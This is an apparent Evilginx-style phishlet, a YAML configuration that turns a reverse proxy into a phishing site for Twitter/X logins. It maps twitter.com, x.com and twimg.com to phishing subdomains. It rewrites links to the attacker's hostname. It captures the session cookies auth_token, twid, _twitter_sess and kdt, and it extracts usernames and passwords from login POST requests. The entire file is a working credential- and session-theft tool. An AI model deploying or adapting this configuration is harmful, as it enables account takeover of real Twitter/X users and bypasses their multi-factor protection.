author: '@white_fi'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'twitter.com', session: true, is_landing: true}
  - {phish_sub: '', orig_sub: '', domain: 'x.com', session: true, is_landing: true}
  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com'}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com'}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'x.com'}
sub_filters:
  - {triggers_on: 'twitter.com', orig_sub: '', domain: 'x.com', search: 'https://x.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'x.com', orig_sub: '', domain: 'twitter.com', search: 'https://twitter.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
auth_tokens:
  - domain: '.twitter.com'
    keys: ['kdt','_twitter_sess','twid','auth_token']
  - domain: '.x.com'
    keys: ['kdt','_twitter_sess','twid','auth_token']
credentials:
  username:
    key: 'session\[username_or_email\]'
    search: '(.*)'
    type: 'post'
  password:
    key: 'session\[password\]'
    search: '(.*)'
    type: 'post'
login:
  domain: 'twitter.com'
  path: '/login'
